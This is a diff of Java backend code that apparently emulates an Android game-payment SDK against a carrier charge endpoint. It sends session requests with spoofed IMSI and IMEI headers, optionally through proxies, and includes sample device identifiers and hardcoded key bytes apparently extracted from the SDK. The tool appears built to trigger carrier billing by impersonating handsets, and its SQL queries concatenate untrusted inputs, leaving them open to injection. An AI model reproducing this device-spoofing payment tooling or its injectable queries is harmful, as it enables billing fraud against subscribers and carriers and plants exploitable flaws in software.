+			conn.setRequestProperty("Accept-Encoding", "gzip");
+			conn.setConnectTimeout(30000);
+			conn.setReadTimeout(30000);
+			//conn.setConnectTimeout(10000);
+			//conn.setReadTimeout(10000);
+			conn.setDoOutput(true);
+			conn.setDoInput(true);
+			out = new PrintWriter(conn.getOutputStream());
+			out.print("en_sessionreq=" + URLEncoder.encode(enreq));
+			out.flush();
+			in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+			String line;
+			while ((line = in.readLine()) != null) {
+				result += line;
+			}
+		} catch (Exception e) {
+			System.out.println("发送 POST 请求出现异常！" + e);
+			e.printStackTrace();
+		} finally {
+			try {
+				if (out != null) {
+					out.close();
+				}
+				if (in != null) {
+					in.close();
+				}
+			} catch (IOException ex) {
+				ex.printStackTrace();
+			}
+		}*/
+		logger.info("getSession1:" + Signature);
+		logger.info("getSession1:" + enreq);
+		logger.info("getSession1:result:" + result);
+		return result;
+	}
+	
+	public String post_getSession2(String SubscriberId, String DeviceId, String Signature, String enreq) {
+		PostNetWork postNetWork =null;
+		String result = "";
+		try {
+			postNetWork = new PostNetWork("http://drm.cmgame.com:81/migusdk/charge/getSession");
+			postNetWork.setConnectionTimeout(this.connectionTimeout);
+			postNetWork.setSoTimeout(this.soTimeout);
+			postNetWork.getPostMethod().addRequestHeader("Header-Signature", Signature);
+			postNetWork.getPostMethod().addRequestHeader("Header-Key", "&apiVersion=1.0&SDKVersion=12001000");
+			postNetWork.getPostMethod().addRequestHeader("Accept", "application/xml");
+			postNetWork.getPostMethod().addRequestHeader("Response-Type", "xml");
+			postNetWork.getPostMethod().addRequestHeader("platform", "Android");
+			postNetWork.getPostMethod().addRequestHeader("apiVersion", "1.0");
+			postNetWork.getPostMethod().addRequestHeader("SDKVersion", "12001000");
+			postNetWork.getPostMethod().addRequestHeader("imsi", SubscriberId);
+			postNetWork.getPostMethod().addRequestHeader("imei", DeviceId);
+			postNetWork.getPostMethod().addRequestHeader("X-OF-Signature", Signature);
+			postNetWork.getPostMethod().addRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+			postNetWork.getPostMethod().addRequestHeader("Host", "drm.cmgame.com:81");
+			postNetWork.getPostMethod().addRequestHeader("Connection", "Keep-Alive");
+			postNetWork.getPostMethod().addRequestHeader("Accept-Encoding", "gzip");
+			
+			postNetWork.setInfoInputStream("en_sessionreq=" + URLEncoder.encode(enreq));
+			//if(true){
+			if(String.valueOf(dmExecLog.getProxyIp()).equals("") || String.valueOf(dmExecLog.getProxyIp()).equals("null")){
+				postNetWork.executeMethod();
+				result = postNetWork.getString("UTF-8");
+			}else{
+				logger.info("ProxyIp..........................post_getSession2................."+dmExecLog.getProxyIp());
+				String[] Proxy =dmExecLog.getProxyIp().split(":");
+				postNetWork.setProxyHost(Proxy[0]);
+				postNetWork.setProxyPort(Integer.parseInt(Proxy[1]));
+				postNetWork.executeMethod(true);
+				result = postNetWork.getString("UTF-8","GZIP");
+			}
+			postNetWork.getNetState();
+		} catch (Exception e) {
+			logger.error(ExceptionTool.getErrorInfo(e));
+		} finally {
+			postNetWork.closeConn();
+		}
+		
+		
+		/*PrintWriter out = null;
+		BufferedReader in = null;
+		try {
+			URL realUrl = new URL("http://drm.cmgame.com:81/migusdk/charge/getSession");
+			URLConnection conn = realUrl.openConnection();
+			conn.setRequestProperty("Header-Signature", Signature);
+			conn.setRequestProperty("Header-Key", "&apiVersion=1.0&SDKVersion=12001000");
+			conn.setRequestProperty("Accept", "application/xml");
+			conn.setRequestProperty("Response-Type", "xml");
+			conn.setRequestProperty("platform", "Android");
+			conn.setRequestProperty("apiVersion", "1.0");
+			conn.setRequestProperty("SDKVersion", "12001000");
+			conn.setRequestProperty("imsi", SubscriberId);
+			conn.setRequestProperty("imei", DeviceId);
+			conn.setRequestProperty("X-OF-Signature", Signature);
+			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+			conn.setRequestProperty("Host", "drm.cmgame.com:81");
+			conn.setRequestProperty("Connection", "Keep-Alive");
+			conn.setRequestProperty("Accept-Encoding", "gzip");
+			conn.setConnectTimeout(30000);
+			conn.setReadTimeout(30000);
+			//conn.setConnectTimeout(10000);
+			//conn.setReadTimeout(10000);
+			conn.setDoOutput(true);
+			conn.setDoInput(true);
+			out = new PrintWriter(conn.getOutputStream());
+			out.print("en_sessionreq=" + URLEncoder.encode(enreq));
+			out.flush();
+			in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+			String line;
+			while ((line = in.readLine()) != null) {
+				result += line;
+			}
+		} catch (Exception e) {
+			System.out.println("发送 POST 请求出现异常！" + e);
+			e.printStackTrace();
+		} finally {
+			try {
+				if (out != null) {
+					out.close();
+				}
+				if (in != null) {
+					in.close();
+				}
+			} catch (IOException ex) {
+				ex.printStackTrace();
+			}
+		}*/
+		logger.info("getSession2:" + Signature);
+		logger.info("getSession2:" + enreq);
+		logger.info("getSession2:result:" + result);
+		return result;
+	}
+	
+	public int logicLimit(String mobile ,String imsi,String consumeCode ,String cpInfoId, String getSpProductConsumeCodeId){
+		try {
+			String sqlp="SELECT spProductId FROM sp_product_consumecode WHERE spProductConsumeCodeId="+getSpProductConsumeCodeId;
+			DbTools dtp=new  DbTools(Const.DB_SPINFO_URL,Const.DB_MYSQL_DRIVER,Const.DB_SPINFO_USERNAME,Const.DB_SPINFO_PASSWORD);
+			CachedRowSetImpl crsq=dtp.executeQuery(sqlp, DmSmsExecLinstenerThreadDao.class);
+			if(crsq.next()){
+				String provId=mobileToProvId(mobile);
+				int infoCode=-1; 
+				String sql="CALL spinfo.logic_limit('"+mobile+"','"+imsi+"','"+consumeCode+"','"+cpInfoId+"',"+provId+",'"+crsq.getString("spProductId")+"')";
+				DbTools dt=new  DbTools(Const.DB_SPINFO_URL,Const.DB_MYSQL_DRIVER,Const.DB_SPINFO_USERNAME,Const.DB_SPINFO_PASSWORD);
+				CachedRowSetImpl crsi=dt.executeQuery(sql, DmSmsExecLinstenerThreadDao.class);
+				ResultSetMetaData rsmd = crsi.getMetaData();
+				while (crsi.next()) {
+					JSONObject jo=new JSONObject();
+					for (int i = 0; i < rsmd.getColumnCount(); i++) {
+						jo.put(rsmd.getColumnName(i + 1), crsi.getObject(i + 1));
+						if(rsmd.getColumnName(i + 1).equals("DB_infoCode")){
+							infoCode=crsi.getInt("DB_infoCode");
+						}
+					}
+				}
+				return infoCode;
+			}else{
+				return -1;
+			}	
+		} catch (Exception e){
+			logger.error(ExceptionTool.getErrorInfo(e));
+			return -1;
+		}
+	}
+	
+	public String mobileToProvId(String mobile) {
+		if(mobile.length()>7){
+			String sql = "SELECT provCode FROM spinfo.mob_city WHERE mob7=" + mobile.substring(0, 7);
+			DbTools dt=new  DbTools(Const.DB_SPINFO_URL,Const.DB_MYSQL_DRIVER,Const.DB_SPINFO_USERNAME,Const.DB_SPINFO_PASSWORD);
+			CachedRowSetImpl crsi=dt.executeQuery(sql, DmSmsExecLinstenerThreadDao.class);
+			try {
+				while (crsi.next()) {
+					return crsi.getString("provCode");
+				}
+			} catch (SQLException e) {
+				logger.error(ExceptionTool.getErrorInfo(e));
+				return "-1";
+			}
+		}
+		return "-1";
+	}
+
+	public static void main (String args[]){
+		
+			PostNetWork postNetWork =null;
+			try {
+				postNetWork = new PostNetWork("http://192.168.254.199:8888");
+				postNetWork.getPostMethod().addRequestHeader("Response-Type", "xml");
+				postNetWork.getPostMethod().addRequestHeader("platform", "Android");
+				postNetWork.getPostMethod().addRequestHeader("apiVersion", "1.0");
+				postNetWork.getPostMethod().addRequestHeader("SDKVersion", "12001000");
+				postNetWork.getPostMethod().addRequestHeader("User-Agent", "aaa");
+				
+				//postNetWork.getPostMethod().addRequestHeader(HttpMethodParams.USER_AGENT, "12001000");
+				//postNetWork.getPostMethod().removeRequestHeader(HttpMethodParams.USER_AGENT);
+			
+				
+				postNetWork.setInfoInputStream("en_sessionreq=" + "1111111111111");
+				
+				
+					postNetWork.executeMethod();
+					postNetWork.getString("UTF-8");
+				
+				postNetWork.getNetState();
+			} catch (Exception e) {
+				
+			} finally {
+				postNetWork.closeConn();
+			}
+			
+		
+		}
+
+}
+
+/*
+String SubscriberId = "460029316856837";
+		String DeviceId = "861007020172600";
+		
+		String appid = "00003392";
+		String apkstatus = "b";// 固定 也可解密网络请求进行确认
+		String chid = "800001654";
+		String contentId = "300000007033";
+		String cpid = "101808";
+		String ctype = "4";
+
+		String itemId = "300007033002";
+		String itemPrice = "300";
+		String itemSafeLevel = "2";
+		String itemMethod = "11";
+		
+		
+		String itemExt = "";
+
+		String sdksessionid = "f2n8rbzdfMskt9kV";// 16位随机数（大小写+数字）
+
+		String cpparam = "123456";
+
+		String transId = dmTools.gettransId();
+		
+		String encodeCID = "g/+rxzyWTe398J8Knokq+Q==";
+		String rand16Num = "ToCeujY6Iw5NatHL";
+		String TimeStamp = "20160108161933";
+		
+		Key1 = new byte[] { 125, -13, 14, 120, 18, 23, -18, 14, 50, -112, -121, -45, 58, 79, 41, 8, 31, 73, -102, 72, 0, 2, 0, 0, 0, 0, 0, 0, 90, 64, 14, 93, 81, 6, 108, 5, 7, 14, 4, 15, 103, 126, 3, 95, 96, 122, 4, 92, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54, 54 };
+		Key2 = new byte[] { -29, 36, -115, 53, 30, -100, -104, 58, 74, 5, 96, 10, -84, 94, 81, -23, 22, -113, -80, 2, 0, 2, 0, 0, 0, 0, 0, 0, 48, 42, 100, 55, 59, 108, 6, 111, 109, 100, 110, 101, 13, 20, 105, 53, 10, 16, 110, 54, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92, 92 }; 
+*/
